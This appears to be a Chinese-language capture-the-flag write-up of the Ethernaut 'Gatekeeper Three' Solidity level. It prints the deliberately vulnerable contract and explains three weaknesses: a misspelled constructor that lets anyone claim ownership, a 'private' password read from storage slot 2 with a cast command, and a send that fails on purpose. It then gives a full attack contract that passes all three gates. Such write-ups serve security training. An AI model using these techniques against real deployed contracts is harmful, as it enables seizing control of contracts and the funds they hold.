# **Gatekeeper Three**

> Cope with gates and become an entrant.
>
> ##### Things that might help:
>
> - Recall return values of low-level functions.
> - Be attentive with semantic.
> - Refresh how storage works in Ethereum.

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allow_enterance = false;
  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allow_enterance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allow_enterance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree returns (bool entered) {
    entrant = tx.origin;
    return true;
  }

  receive () external payable {}
}

```



## 攻击思路

有三面门需要破壁。

1. 需要使用攻击合约调用`GatekeeperThree`合约，并且这个攻击合约地址还要是`GatekeeperThree`合约的`owner`。

   - `GatekeeperThree`合约在设置`owner`时，将构造函数`constructor`错误地写为了`construct0r`。所以攻击合约需要调用一次`construct0r`函数，成为`owner`。

2. 需要将`GatekeeperThree`合约的`allow_enterance`变量从`false`转为`true`。

   - `allow_enterance`变量只能在`getAllowance`函数中调用`trick`合约的`checkPassword`函数成功返回`true`时，才能修改为`true`。而`trick`合约的`checkPassword`函数需要判断传入的`_password`是否与合约存储的私有变量`password`相同。可链上没有私有数据。

     通过读取`trick`合约内存插槽`slot2`中存储的值，即可知道`password`。使用`cast storage`命令行工具查询。

     ```shell
     cast storage 0x4598a3C70236502617773CED963E5D43d9934091 2 --rpc-url https://rpc.ankr.com/eth_goerli
     ```

3. 需要给`GatekeeperThree`合约转大于`0.001 ether`，并且我们的攻击合约在接收`ETH`时需要失败。

   - 在调用`GatekeeperThree`合约的同时转移大于`0.001 ether`，并且在攻击合约的`receive `函数中无脑revert就好。



## 攻击合约

```solidity
contract Attack {
    function attack(address payable gatekeeperThree, uint256 _password)
        public
        payable
    {
        // gateOne
        GatekeeperThree(gatekeeperThree).construct0r();

        // gateTwo
        GatekeeperThree(gatekeeperThree).getAllowance(_password);

        // gateThree
        payable(gatekeeperThree).call{value: 0.0011 ether}("");

        // enter
        GatekeeperThree(gatekeeperThree).enter();
    }

    receive() external payable {
        revert();
    }
}
```



合约处于`constructor函数`中时，无法接收ETH转移。




Nice job! For more information read this: https://web3js.readthedocs.io/en/v1.2.9/web3-eth.html?highlight=getStorageAt#getstorageat and this https://medium.com/loom-network/ethereum-solidity-memory-vs-storage-how-to-initialize-an-array-inside-a-struct-184baf6aa2eb .

